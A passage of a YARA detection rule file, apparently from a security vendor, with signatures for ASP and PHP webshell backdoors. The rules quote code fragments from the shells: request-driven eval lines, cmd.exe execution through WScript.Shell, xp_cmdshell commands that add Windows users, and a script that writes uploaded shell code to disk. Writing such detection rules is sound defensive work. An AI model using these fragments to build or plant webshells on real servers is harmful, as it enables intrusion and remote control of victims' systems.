        $s13 = "dYvJ^W9+Eb@#@&k6~l9NmK[n'rJ,Y4+U~mN[mK[+{J@!r6Dlhn,/.m{4DY2=zJF FRZ !cF&:ctOh,hk9Ot{!P4nro4Y{!@*@!&r6DC:" fullword ascii
        $s14 = "xvtbN9+UB~r9'vwK.YEP-C^E+xvr[2WMOLJv@*@!JYN@*J@#@&I\"?E@!bx2;DPxmh+{BmE~OXa+{B4k[[" fullword ascii
        $s15 = "x,Y:a1mh+,'~HbNcOsw1mh+BPFB~(xkYM`q~~OswHlsn~,m4.v,#b~ Pq#@#@&id7id&0P&xUODvYhwglhnBP\\(/Dd0#,@*~!,K4+UPOha1C:" fullword ascii
        $s16 = "obVl,DD@!@*E3Ul^4mv{Y+T.lDPBs.G0akE'n:CU,B2/m /ak&hKmR0f8wrRSASz&=wDYtE'" fullword ascii
        $s17 = "RJ@#@&id72U[,kW@#@&7diqW~bx/O.vPWk^nD6OBPdmlk+vE?4+E[GW\\z~+/D'J^VRz22VbmmYrWUE*PbPK.P&xdOM`PWr^+O6DS,S^m/" fullword ascii
        $s18 = "Dd@#@&7wW.PACm4PWq,kx~W1@#@&dij4WAzV^sk^+,2lDt'J'J'W8Rxmh+@#@&dij;:wW^NnDd~{PjEsoW^Nn.kP_~q@#@&~P,~g+aD@#@&d?" fullword ascii
        $s19 = ";;2jPcK6YmJAHK3j@!FPO4A1~2o(DPj`4@#@&P,P,j+DPPF,'~/M+l:3W~9+1OcW(YvvS!bb@#@&7Y8 YHw3~{PF~l,YqRt6G2~{&,)PDFcGw" fullword ascii
        $s20 = "JLkUWbV+k'J@!zY9@*@!Y9@*r[!+O9mYnZMnlD+cWbV+2CDtb[r@!(D@*r[V+YGlDnHKNr0H`Wr^+wmOt*[J@!&ON@*@!JY.@*E@#@&d7dijE" fullword ascii
     condition:
        ( uint16(0) == 0x253c and filesize < 300KB and ( 8 of them ) ) or ( all of them )
}

rule sig_2fe09192665a99a29d93d83ad35c03fde41fc7a9
{
     meta:
        description = "asp - file 2fe09192665a99a29d93d83ad35c03fde41fc7a9.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "fa992dca848591c1dc287e04c63e560c203357ab20af2f6ce92536411c8af61e"
     strings:
        $s1 = "<p>The requested URL /test/download/test1.php was not found on this server.</p>" fullword ascii
        $s2 = "@preg_replace(\"/[checksql]/e\",$_POST['heroes'],\"saft\");  " fullword ascii
     condition:
        ( uint16(0) == 0x213c and filesize < 1KB and ( all of them ) ) or ( all of them )
}

rule sig_126696aef7b579944e2746f15fb8cc5c8aecd3bd
{
     meta:
        description = "asp - file 126696aef7b579944e2746f15fb8cc5c8aecd3bd.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "e1e23cfb691598483accdb9a2ffe379b7ce9bb425d1089bb58327625e1b0885a"
     strings:
        $s1 = "#37;\"),\"(\",\"[\"),\")\",\"]\"),\"/\",\"&#47;\"),\"'\",\"&#39;\"),\"\"\"\",\"&#34;\")" fullword ascii /* hex encoded string '7G94' */
        $s2 = "<meta http-equiv=\"Content-Type\" content=\"text/html; charset=gb2312\" />" fullword ascii
        $s3 = "<textarea rows=\"5\" id=\"what\" style=\"font-family:Times New Roman;font-size:14pt;\" cols=\"80\" name=\"what\">" fullword ascii
        $s4 = "uip = Request.ServerVariables(\"HTTP_X_FORWARDED_FOR\")" fullword ascii
        $s5 = "<p><a href=\"#img\" onclick=\"document.getElementById('what').value+='[img]" fullword ascii
        $s6 = "server.scripttimeout=120" fullword ascii
        $s7 = "<p class=\"tx\">Chating Room is Powered By <a href=\"http://blackbap.org\" target=\"_blank\">Silic Group Hacker Army</a>&copy;20" ascii
        $s8 = "<p class=\"tx\">Chating Room is Powered By <a href=\"http://blackbap.org\" target=\"_blank\">Silic Group Hacker Army</a>&copy;20" ascii
        $s9 = "If uip = \"\" Then uip = Request.ServerVariables(\"REMOTE_ADDR\")" fullword ascii
        $s10 = "Set Fs=Server.CreateObject(\"Scripting.FileSystemObject\") " fullword ascii
        $s11 = "<a style=\"letter-spacing:3px;\"><b>Hacked! Owned by Chinese Hackers!</b><br></a>" fullword ascii
        $s12 = ">>> Fucked at:\"&tm&\"</p></pre>\"" fullword ascii
        $s13 = "response.write \"<script>location.replace(location.href);</script>\"" fullword ascii
        $s14 = "data = replace(data,\"[img]\",\"<img src=\"\"http://\")" fullword ascii
        $s15 = "pre{font-size:15pt;font-family:Times New Roman;line-height:120%;}" fullword ascii
        $s16 = "<form method=post action=\"?\">" fullword ascii
        $s17 = "ff = Request.ServerVariables(\"SCRIPT_NAME\")" fullword ascii
     condition:
        ( uint16(0) == 0x213c and filesize < 6KB and ( 8 of them ) ) or ( all of them )
}

rule c34f33a3d2927d889490ef9783944bc5231c74e2
{
     meta:
        description = "asp - file c34f33a3d2927d889490ef9783944bc5231c74e2.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "291f142cf50354c5f224c02823c6f752fe9b73ea120829c357cda51719efbf80"
     strings:
        $x1 = "j cdx&\"<a href='http://mytool.chinaz.com/baidusort.aspx?host=\"&str1&\"&sortType=0' target='FileFrame'>\"&cxd&\" " fullword ascii
        $x2 = "j cdx&\"<a href='http://www.odayexp.com/h4cker/tuoku/' target='FileFrame'>\"&cxd&\" <font color=red>" fullword ascii
        $x3 = "j cdx&\"<a href='http://www.114best.com/ip/114.aspx?w=\"&str1&\"' target='FileFrame'>\"&cxd&\" " fullword ascii
        $x4 = "j cdx&\"<a href='http://www.aizhan.com/siteall/\"&str1&\"' target='FileFrame'>\"&cxd&\" " fullword ascii
        $x5 = "j cdx&\"<a href='http://odayexp.com/h4cker/sql/' target='FileFrame'>\"&cxd&\" SQL---" fullword ascii
        $x6 = "TypeList =  \".asp.asa.bat.bmp.com.doc.db.dll.exe.gif.htm.html.inc.ini.jpg.js.log.mdb.mid.mp3.png.php.rm.rar.swf.txt.wav.xls." fullword ascii
        $s7 = "j cdx&\"<a href='?Action=EditPower&PowerPath=\\\\.\\\"&OOOO&\"' target='FileFrame'>\"&cxd&\" <font color=red>" fullword ascii
        $s8 = "j cdx&\"<a href='?Action=Cmd1Shell' target='FileFrame'>\"&cxd&\" " fullword ascii
        $s9 = "j cdx&\"<a href='?Action=Logout' target='_top'>\"&cxd&\" <font color=green>" fullword ascii
        $s10 = "j cdx&\"<a href='?Action=cmdx' target='FileFrame'>\"&cxd&\" " fullword ascii
        $s11 = "ion='http://www.baidu.com/ips8.asp' name='ipform' target='_blank'><tr align='center'><td height='20' width='200' bgcolor='#FFFFF" ascii
        $s12 = "</td><td bgcolor='#FFFFFF'> </td><td bgcolor='#FFFFFF'>\"&request.serverVariables(\"SERVER_NAME\")&\"</td></tr><form method=post" ascii
        $s13 = "j cdx&\"<a href='http://tool.chinaz.com/Tools/Robot.aspx?url=\"&str1&\"&btn=+" fullword ascii
        $s14 = "j cdx&\"<a href='?Action=MMD' target='FileFrame'>\"&cxd&\" SQL-----SA\"&ef" fullword ascii
        $s15 = "j SI&\"</tr></table>\":execute(shisanfun(\"fi dne:fi dne:fi dne:1+)" fullword ascii
        $s16 = "j cdx&\"<a href='?Action=ProFile' target='FileFrame'>\"&cxd&\" <font color=red>" fullword ascii
        $s17 = "j cdx&\"<a href='?Action=ScanPort' target='FileFrame'>\"&cxd&\" " fullword ascii
        $s18 = "j cdx&\"<a href='?Action=ScanDriveForm' target='FileFrame'>\"&cxd&\" " fullword ascii
        $s19 = "j cdx&\"<a href='?Action=suftp' target='FileFrame'>\"&cxd&\" Su---FTP" fullword ascii
        $s20 = "j cdx&\"<a href='?Action=radmin' target='FileFrame'>\"&cxd&\" Radmin" fullword ascii
     condition:
        ( uint16(0) == 0x253c and filesize < 300KB and ( 1 of ($x*) and 4 of them ) ) or ( all of them )
}

rule cceb99d11f865afe4e61f6f97b3cf7a45a93c35a
{
     meta:
        description = "asp - file cceb99d11f865afe4e61f6f97b3cf7a45a93c35a.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "6a8800488d029688c9b4dfcc59adb807c0682fa1c02c17d74e25162e72fd1907"
     strings:
        $s1 = "<%execute request(" fullword ascii
     condition:
        ( uint16(0) == 0x253c and filesize < 1KB and ( all of them ) ) or ( all of them )
}

rule sig_788928ae87551f286d189e163e55410acbb90a64
{
     meta:
        description = "asp - file 788928ae87551f286d189e163e55410acbb90a64.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "7d72ed0ef1b497619f12bc962512061d131c96cf9bcedd4a9a4345490e0a088c"
     strings:
        $x1 = "frames.byZehir.document.execCommand('InsertImage', false, imagePath);" fullword ascii
        $x2 = "frames.byZehir.document.execCommand(command, false, option);" fullword ascii
        $s3 = "response.Write \"<title>ZehirIV --> Powered By Zehir &lt;zehirhacker@hotmail.com&gt;</title>\"" fullword ascii
        $s4 = "Response.Write \"<tr><td><b><font color=red>Log Root</td><td> \" & request.servervariables(\"APPL_MD_PATH\") & \"</td></tr>\"" fullword ascii
        $s5 = "Response.Write \"<form method=get action='\"&DosyPath&\"' target='_opener' id=form1 name=form1>\"" fullword ascii
        $s6 = "Response.AddHeader \"Content-Disposition\", \"attachment; filename=\" & Fil.name" fullword ascii
        $s7 = "objConn.Execute strSQL" fullword ascii
        $s8 = "Private Sub AddField(ByRef pstrName, ByRef pstrFileName, ByRef pstrContentType, ByRef pstrValue, ByRef pbinData)" fullword ascii
        $s9 = "Response.Write \"<form method=get target='_opener' action='\"&DosyPath&\"'>\"" fullword ascii
        $s10 = "response.Write \"<iframe style='width:0; height:0' src='http://localhost/tuzla-ebelediye'></iframe>\"" fullword ascii
        $s11 = "Response.Write \"<tr><td><b><font color=red>HTTPD</td><td> \" & request.servervariables(\"SERVER_SOFTWARE\") & \"</td></tr>\"" fullword ascii
        $s12 = "Response.Write \"<tr><td><b><font color=red>Port</td><td> \" & request.servervariables(\"SERVER_PORT\") & \"</td></tr>\"" fullword ascii
        $s13 = "Call Err.Raise(vbObjectError + 1, \"clsUpload.asp\", \"Object does not exist within the ordinal reference.\")" fullword ascii
        $s14 = "llngStart = InStrB(1, pbinChunk, CRLF & CStrB(\"Content-Type:\"), vbTextCompare)" fullword ascii
        $s15 = "llngStart = InStrB(1, pbinChunk, CRLF & CStrB(\"Content-Disposition:\"), vbTextCompare)" fullword ascii
        $s16 = "Response.Write \"<tr><td><b><font color=red>HTTPS</td><td> \" & request.servervariables(\"HTTPS\") & \"</td></tr>\"" fullword ascii
        $s17 = "Response.Write \"<tr><td><b>Local Path </td><td><font color=red>yazma yetkisi yok! : [\"&err.Description&\"]</td></tr>\"" fullword ascii
        $s18 = "<input style=\"width:100%\" type=text name=\"FileName\" id=\"FileName\" value=\"byzehir.txt\" size=\"20\"></td" fullword ascii
        $s19 = "<input style=\"width:100%\" type=text name=\"FileName\" id=\"FileName\" value=\"byzehir.txt\" size=\"20\"></td>" fullword ascii
        $s20 = "MyFile.write \"byzehir <zehirhacker@hotmail.com>\"" fullword ascii
     condition:
        ( uint16(0) == 0x3c0a and filesize < 100KB and ( 1 of ($x*) and 4 of them ) ) or ( all of them )
}

rule a592851dc2518cbcfb1a37f527fdb003f1a5c5a2
{
     meta:
        description = "asp - file a592851dc2518cbcfb1a37f527fdb003f1a5c5a2.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "fd91d593a7c083e8929aa298214373b335879e385c842041469bed945c580df5"
     strings:
        $x1 = "Paths_str=\"C:\\WINDOWS\"&chr(13)&chr(10)&\"C:\\Documents and Settings\"&chr(13)&chr(10)&\"C:\\Program Files\"&chr(13)&chr(10)&" ascii
        $s2 = "Filters\\\"&chr(13)&chr(10)&\"C:\\Documents and Settings\\All Users\\Application Data\\McAfee\\DesktopProtection\"&chr(13)&chr(1" ascii
        $s3 = "t SQL Server\\90\\Shared\\ErrorDumps\"&chr(13)&chr(10)&\"c:\\Program Files\\KSafe\\AppData\\update\"&chr(13)&chr(10)&\"c:\\Progr" ascii
        $s4 = "\\spool\"&chr(13)&chr(10)&\"C:\\WINDOWS\\Tasks\"&chr(13)&chr(10)&\"C:\\WINDOWS\\7i24.com\\FreeHost\"&chr(13)&chr(10)&\"C:\\WINDO" ascii
        $s5 = "10)&\"C:\\Documents and Settings\\All Users\\Documents\\My Music\\" fullword ascii
        $s6 = "&\"c:\\Program Files\\Microsoft SQL Server\\90\\Shared\\ErrorDumps\"&chr(13)&chr(10)&\"C:\\Program Files\\Symantec AntiVirus\\SA" ascii
        $s7 = "ework\\v2.0.50727\\Temporary ASP.NET Files\\root\\\"&chr(13)&chr(10)&\"c:\\Program Files\\Common Files\"&chr(13)&chr(10)&\"c:\\P" ascii
        $s8 = "\\My Music\\Sample Playlists\"&chr(13)&chr(10)&\"C:\\Documents and Settings\\All Users\\Documents\\My Music\\Sync Playlists\"&ch" ascii
        $s9 = "\\Application Data\\VMware\\Compatibility\\native\"&chr(13)&chr(10)&\"c:\\Documents and Settings\\All Users\\Application Data\\V" ascii
        $s10 = "chr(10)&\"C:\\Documents and Settings\\All Users\\Documents\\My Music\\\"&chr(13)&chr(10)&\"C:\\Documents and Settings\\All Users" ascii
        $s11 = "Health\\ERRORREP\\QHEADLES\"&chr(13)&chr(10)&\"C:\\WINDOWS\\PCHealth\\ERRORREP\\QSIGNOFF\"&chr(13)&chr(10)&\"c:\\windows\\Micros" ascii
        $s12 = "cation Data\\kingsoft\\kis\\KCLT\\\"&chr(13)&chr(10)&\"C:\\php\\PEAR\"&chr(13)&chr(10)&\"C:\\7i24.com\\iissafe\\log\"&chr(13)&ch" ascii
        $s13 = "crosoft\\Crypto\\RSA\\MachineKeys\"&chr(13)&chr(10)&\"c:\\Documents and Settings\\All Users\\Application Data\\Microsoft\\Media " ascii
        $s14 = "sers\\Application Data\\Microsoft\\Crypto\\DSS\\MachineKeys\"&chr(13)&chr(10)&\"c:\\Documents and Settings\\All Users\\Applicati" ascii
        $s15 = "ocuments and Settings\\All Users\\Application Data\\Microsoft\\Network\\Connections\\Pbk\"&chr(13)&chr(10)&\"c:\\Documents and S" ascii
        $s16 = "C:\\Documents and Settings\\All Users\\Application Data\"&chr(13)&chr(10)&\"C:\\Documents and Settings\\All Users\\Application D" ascii
        $s17 = "\"c:\\Documents and Settings\\All Users\\Application Data\\VMware\\Compatibility\"&chr(13)&chr(10)&\"c:\\Documents and Settings" ascii
        $s18 = "\\Microsoft\\HTML Help\"&chr(13)&chr(10)&\"c:\\Documents and Settings\\All Users\\Application Data\\Microsoft\\Media Index\"&chr" ascii
        $s19 = "Paths_str=\"C:\\WINDOWS\"&chr(13)&chr(10)&\"C:\\Documents and Settings\"&chr(13)&chr(10)&\"C:\\Program Files\"&chr(13)&chr(10)&" ascii
        $s20 = "13)&chr(10)&\"f:\\\"&chr(13)&chr(10)&\"g:\\\"&chr(13)&chr(10)&\"h:\\\"" fullword ascii
     condition:
        ( uint16(0) == 0x483c and filesize < 40KB and ( 1 of ($x*) and 4 of them ) ) or ( all of them )
}

rule de5056b7ab754cff0459ca003d16ea69a89eb6d2
{
     meta:
        description = "asp - file de5056b7ab754cff0459ca003d16ea69a89eb6d2.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "7f4139601930bba578adbd3f152397f7396688744df2b231b2fcaa90e36a995f"
     strings:
        $x1 = "seshell.ShellExecute shellpath,\" /c \" & defcmd & \" > \" & sztempfile,\"\",\"open\",0" fullword ascii
        $x2 = "CONn.EXEcutE(\"Create Table FileData(Id int IDENTITY(0,1) PRIMARY KEY CLUSTERED, thePath VarChar, fileContent Image)\")" fullword ascii
        $x3 = "'jb\"<tr><td height='22'><a href='http://tiquan.net/pr/?Submit=+%B2%E9+%D1%AF+&domain=\"&Worinima&\"' target='FileFrame'>" fullword ascii
        $x4 = "jb\"<title>\"&nimajb&\" - \"&nimajbm&\" </title>\":jb\"<style type=\"\"text/css\"\">\":jb\"body,td{font-size: 12px;background-co" ascii
        $x5 = "ConnstR=\"Provider=SQLOLEDB.1;Data Source=\" & tARgETIp &\",\"& PoRtNUm &\";User ID=lake2;Password=;\"" fullword ascii
        $s6 = "'jb\"<tr><td height='22'><a href='http://tiquan.net/ip/?action=sed&cx_33=\"&ServerU&\"' target='FileFrame'>" fullword ascii
        $s7 = "<input name='ToPath'value='\"&RRePath(Session(\"FolderPath\")&\"\\Cmd.exe\")&\"' size='40'>\"" fullword ascii
        $s8 = "!)</font></a></center>\":jb\"<tr><td height='20'><a href='?Action=Upload' target='FileFrame'><center><font color=red size=5px>(" fullword ascii
        $s9 = "jb\"<input type=hidden name=\"\"#\"\" value=Execute(Session(\"\"#\"\"))>\"" fullword ascii
        $s10 = "jb\"<tr><td height='20'><a href='?Action=Cmd1Shell' target='FileFrame'>" fullword ascii
        $s11 = "'jb\"<tr><td height='22'><a href='http://tiquan.net/mmgx/index.htm' target='FileFrame'>" fullword ascii
        $s12 = "b.open \"GET\", \"http://127.0.0.1:\" & ftpport & \"/M_Schumacher/upadmin/s2\", True, \"\", \"\"" fullword ascii
        $s13 = "xpost3.open \"POST\", \"http://127.0.0.1:\"& port &\"/leaves\", true" fullword ascii
        $s14 = "xpost.open \"POST\", \"http://127.0.0.1:\"& port &\"/leaves\", true" fullword ascii
        $s15 = "a.open \"GET\", \"http://127.0.0.1:\" & port & \"/M_Schumacher/upadmin/s1\",True, \"\", \"\"" fullword ascii
        $s16 = "c.open \"GET\", \"http://127.0.0.1:\" & port & \"/M_Schumacher/upadmin/s3\", True, \"\", \"\"" fullword ascii
        $s17 = "jb\"<tr><td height='20'><a href='?Action=hiddenshell' target='FileFrame'>" fullword ascii
        $s18 = "CONN.ExecUtE(sqlSTR)" fullword ascii
        $s19 = "\" then: tmp = Mid(bb, i, 1) + tmp:else:tmp=vbcrlf&tmp:end if:next:Unlin=tmp:end function:  Case \"ReadREG\":call ReadREG():Case" ascii
        $s20 = "\"\");FullDbStr(0);return false;}return true;}\":jb\"function FullDbStr(i){if(i<0){return false;}Str = new Array(12);Str[0] = \"" ascii
     condition:
        ( uint16(0) == 0x6f3c and filesize < 300KB and ( 1 of ($x*) and 4 of them ) ) or ( all of them )
}

rule sig_45cdac89a10152fdc1c19b6d9871d8a253c567c8
{
     meta:
        description = "asp - file 45cdac89a10152fdc1c19b6d9871d8a253c567c8.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "251587a4e8fe29c43ea4811c521c1a471a1bf33eed03a81ade5d07e46c32f5c9"
     strings:
        $x1 = "sResult = oWshl.Exec(\"cmd.exe /c del \" & rootPath & \"\\ReadRegX\").StdOut.ReadAll()" fullword ascii
        $x2 = "sResult = oWshl.Exec(\"cmd.exe /c type \" & rootPath & \"\\ReadRegX\").StdOut.ReadAll()" fullword ascii
        $x3 = "conn.Execute(\"Create Table FileData(Id int IDENTITY(0,1) PRIMARY KEY CLUSTERED, P Text, fileContent Image)\")" fullword ascii
        $x4 = "(1)<option value=\"\"select * from openrowset('microsoft.jet.oledb.4.0',';database=c:\\winnt\\system32\\ias\\ias.mdb','select sh" ascii
        $x5 = "<option value=\"\"DROP TABLE [jnc];exec master..xp_regwrite 'HKEY_LOCAL_MACHINE','SOFTWARE\\Microsoft\\Jet\\4.0\\Engines','SandB" ascii
        $x6 = "uot;cmd.exe /c copy 8617.tmp jnc.tmp&quot;)');BULK INSERT [jnc] FROM 'jnc.tmp' WITH (KEEPNULLS);\"\">xp_regwrite" fullword ascii
        $x7 = "\"<option value=\"\"Exec master.dbo.XP_CMDShell 'net user lcx lcx /add'\"\">XP_CMDShell" fullword ascii
        $x8 = ";cmd.exe /c del 8617.tmp&&del jnc.tmp&quot;)');\"\">xp_regwrite" fullword ascii
        $x9 = "sp_OACreate<option value=\"\"Use master dbcc addextendedproc ('xp_cmdshell','xplog70.dll')\"\">" fullword ascii
        $x10 = "@o out exec sp_oamethod @o,'run',NULL,'cmd /c net user > 8617.tmp',0,true;BULK INSERT [jnc] FROM '8617.tmp' WITH (KEEPNULLS);\"" ascii
        $x11 = "(2)<option value=\"\"CREATE TABLE [jnc](ResultTxt nvarchar(1024) NULL);use master declare @o int exec sp_oacreate 'wscript.shell" ascii
        $x12 = "sCmd = \"RegEdit.exe /e \"\"\" & rootPath & \"\\ReadRegX\"\" \"\"\" & thePath & \"\"\"\"" fullword ascii
        $s13 = "xp_cmdshell<option value=\"\"Use master dbcc addextendedproc ('xp_regwrite','xpstar.dll')\"\">" fullword ascii
        $s14 = "<option value=\"\" EXEC [master].[dbo].[xp_makecab] 'c:\\test.cab','default',1,'d:\\cmd.asp'\"\">" fullword ascii
        $s15 = "Response.AddHeader \"Content-Disposition\", \"Attachment; Filename=\" & Mid(sUrlB, InStrRev(sUrlB, \"/\") + 1)" fullword ascii
        $s16 = "Response.Write(\"oShl.ShellExecute \" & appName & \", \" & appArgs & \", \" & appPath & \", \"\"\"\", 0\")" fullword ascii
        $s17 = "cmdStr = \"c:\\progra~1\\WinRAR\\Rar.exe a \"\"\" & cmdStr & \"\\Packet.rar\"\" \"\"\" & cmdStr & \"\"\"\"" fullword ascii
        $s18 = "\"<option value=\"\"CREATE TABLE [jnc](ResultTxt nvarchar(1024) NULL);exec master..xp_regwrite 'HKEY_LOCAL_MACHINE','SOFTWARE\\M" ascii
        $s19 = "document.write(\"<a href=\\\"javascript:Command('Query','\" + i + \"');\\\">\");" fullword ascii
        $s20 = "<option value=\"\"DROP TABLE [jnc];declare @o int exec sp_oacreate 'wscript.shell',@o out exec sp_oamethod @o,'run',NULL,'cmd /c" ascii
     condition:
        ( uint16(0) == 0x6f3c and filesize < 300KB and ( 1 of ($x*) and all of them ) ) or ( all of them )
}

rule df3bf82af4c5dbcd4a0b0f7cf1e3e4aa99c3f57d
{
     meta:
        description = "asp - file df3bf82af4c5dbcd4a0b0f7cf1e3e4aa99c3f57d.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "0a7ea234cea4029083f748712ee5890df222a33323e57db1b0b33dd352198bd1"
     strings:
        $x1 = "Call oScript.Run (\"cmd.exe /c \" & szCMD & \" > \" & szTempFile, 0, True)" fullword ascii
        $s2 = "' -- Read the output from our command and remove the temp file -- '" fullword ascii
        $s3 = "szTempFile = \"C:\\\" & oFileSys.GetTempName( )" fullword ascii
        $s4 = "<%= \"\\\\\" & oScriptNet.ComputerName & \"\\\" & oScriptNet.UserName %>" fullword ascii
        $s5 = "' -- check for a command that we have posted -- '" fullword ascii
        $s6 = "' -- Use a poor man's pipe ... a temp file -- '" fullword ascii
        $s7 = "' Author: Maceo <maceo @ dogmile.com>" fullword ascii
        $s8 = "' -- create the COM objects that we will be using -- '" fullword ascii
        $s9 = "<input type=text name=\".CMD\" size=45 value=\"<%= szCMD %>\">" fullword ascii
        $s10 = "Set oFile = oFileSys.OpenTextFile (szTempFile, 1, False, 0)" fullword ascii
        $s11 = "<FORM action=\"<%= Request.ServerVariables(\"URL\") %>\" method=\"POST\">" fullword ascii
        $s12 = "Set oScript = Server.CreateObject(\"WSCRIPT.SHELL\")" fullword ascii
        $s13 = "Set oFileSys = Server.CreateObject(\"Scripting.FileSystemObject\")" fullword ascii
        $s14 = "szCMD = Request.Form(\".CMD\")" fullword ascii
        $s15 = "Response.Write Server.HTMLEncode(oFile.ReadAll)" fullword ascii
        $s16 = "Set oScriptNet = Server.CreateObject(\"WSCRIPT.NETWORK\")" fullword ascii
        $s17 = "' -------------------------------------------" fullword ascii
        $s18 = "' --------------------o0o--------------------" fullword ascii
        $s19 = "Dim szCMD, szTempFile" fullword ascii
        $s20 = "Call oFileSys.DeleteFile(szTempFile, True)" fullword ascii
     condition:
        ( uint16(0) == 0x253c and filesize < 4KB and ( 1 of ($x*) and 4 of them ) ) or ( all of them )
}

rule c6768d5b03921d59ae1c1d5095a087368d87e4e0
{
     meta:
        description = "asp - file c6768d5b03921d59ae1c1d5095a087368d87e4e0.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "a24d35c8df105a2dd3684c1b8b8bfe57d21011ab681d1d330b9fb1e1c93d0471"
     strings:
        $s1 = "set TextFile=FileObject.CreateTextFile(Server.MapPath(\"up1oad.asp\"))" fullword ascii
        $s2 = "set FileObject=Server.CreateObject(\"Scripting.FileSystemObject\")" fullword ascii
        $s3 = "<form name='form1' method='post' action=''>" fullword ascii
        $s4 = "response.redirect(\"up1oad.asp\")" fullword ascii
        $s5 = "TextFile.Write(shell)" fullword ascii
        $s6 = "<td><textarea name='txt' rows='1' id='txt' style='overflow:hidden'></textarea></td>" fullword ascii
        $s7 = "shell=request(\"txt\")" fullword ascii
     condition:
        ( uint16(0) == 0x253c and filesize < 1KB and ( all of them ) ) or ( all of them )
}

rule bd850a2a43572b8bc87f0a3fbb76d8d47779f73f
{
     meta:
        description = "asp - file bd850a2a43572b8bc87f0a3fbb76d8d47779f73f.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "c895f45603871a4844bc5f112b16b3bd31adc03f01d8ff6e8bff7b6fed470d03"
     strings:
        $s1 = "<%=\"<center><img src=http://www.baidu.com/img/baidu_logo.gif width=270 height=129>\"%>" fullword ascii
        $s2 = "<%=\"<input name='pass' type='password' size='33'> <input \"%><%=\"type='submit' value='" fullword ascii
        $s3 = "<%=\"<span style='border-bottom:#0000FF solid 1px;'><font size=2 color='#0000FF'><a href=http://www.baidu.cn>" fullword ascii
        $s4 = "<%=\"<span style='border-bottom:#0000FF solid 1px;'><font color='#0000FF'><a href=http://www.hake.cc>" fullword ascii
        $s5 = "</a>  <a href=http://www.hake.cc>MP3</a>  <a href=http://www.hake.cc>" fullword ascii
        $s6 = "<%=\"<center><br><form action='' method='post'>\"%>" fullword ascii
        $s7 = ":\"&server.mappath(request.servervariables(\"script_name\"))%>" fullword ascii
        $s8 = "<%=\"<font color='#0000FF'><a href=http://www.hake.cc>" fullword ascii
        $s9 = "</a>  <a href=http://www.hake.cc>" fullword ascii
        $s10 = "if request(\"pass\")=\"dog\" then" fullword ascii
        $s11 = "<%if session(\"pw\")<>\"go\" then %>" fullword ascii
        $s12 = "<%=\"<textarea name=da cols=50 rows=10 width=30></textarea>\"%>" fullword ascii
     condition:
        ( uint16(0) == 0x253c and filesize < 5KB and ( 8 of them ) ) or ( all of them )
}

rule sig_9065860c36557b5843d1a433100610d2054762be
{
     meta:
        description = "asp - file 9065860c36557b5843d1a433100610d2054762be.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "c4f1ef150f666537d2a6f97f432419c38c63fc3818b1b97ee5dca3ff804e2ff8"
     strings:
        $x1 = "j oScriptlhn.exec(\"cmd.exe /c\"&request(\"cmd\")).stdout.readall " fullword ascii
        $x2 = "</b><input type=text name=P VALUES=123456>&nbsp;<input type=submit value=Execute></td></tr></table></form>\":j SI:SI=\"\":If tri" ascii
        $x3 = "j cdx&\"<a href='http://www.aizhan.com/siteall/\"&domain&\"' target='FileFrame'>\"&cxd&\" " fullword ascii
        $x4 = "j cdx&\"<a href='http://odayexp.com/h4cker/gx/' target='FileFrame'>\"&cxd&\" " fullword ascii
        $x5 = "end if :j oScriptlhn.exec(request(\"cmdx\")&\" /c\"&request(\"cmd\")).stdout.readall :j(\"</textarea></center>\")" fullword ascii
        $x6 = "j cdx&\"<a href='?Action=EditPower&PowerPath=\\\\.\\\"&ScriptPath&\"' target='FileFrame'>\"&cxd&\" " fullword ascii
        $x7 = "j(\"<center><form method='post'> \"):j(\"<input type=text name='cmdx' size=60 value='cmd.exe'><br> \"):j(\"<input type=text name" ascii
        $s8 = "<a><a class=am href='javascript:ShowFolder(\"\"C:\\\\Documents and Settings\\\\All Users\\\\Documents\"\")'>(4)" fullword ascii
        $s9 = "j cdx&\"<a href='?Action=Cmd1Shell' target='FileFrame'>\"&cxd&\" " fullword ascii
        $s10 = "):<br/><form method=post><input type=hidden name=\"\"#\"\" value=Execute(Session(\"\"#\"\"))><input name=thePath value=\"\"\" & " ascii
        $s11 = "<a>&nbsp;&nbsp;&nbsp;&nbsp;<a class=am href='javascript:ShowFolder(\"\"C:\\\\Program Files\\\\RhinoSoft.com\"\")'>(3)" fullword ascii
        $s12 = "<a><a class=am href='javascript:ShowFolder(\"\"C:\\\\Documents and Settings\\\\All Users\\\\\"\")'>(5)" fullword ascii
        $s13 = "<a><a class=am href='javascript:ShowFolder(\"\"C:\\\\Documents and Settings\\\\All Users\\\\" fullword ascii
        $s14 = "):<br/><form method=post><input type=hidden name=\"\"#\"\" value=Execute(Session(\"\"#\"\"))><input name=thePath value=\"\"\" & " ascii
        $s15 = ":<form method=post><input type=hidden name=\"\"#\"\" value=Execute(Session(\"\"#\"\"))><input name=thePath value=\"\"\" & HtmlEn" ascii
        $s16 = ":<form method=post><input type=hidden name=\"\"#\"\" value=Execute(Session(\"\"#\"\"))><input name=thePath value=\"\"\" & HtmlEn" ascii
        $s17 = "i=i+1:Next:copyurl=chr(60)&chr(115)&chr(99)&chr(114)&chr(105)&chr(112)&chr(116)&chr(32)&chr(115)&chr(114)&chr(99)&chr(61)&chr(39" ascii
        $s18 = "j(\"<center><form method='post'> \"):j(\"<input type=text name='cmdx' size=60 value='cmd.exe'><br> \"):j(\"<input type=text name" ascii
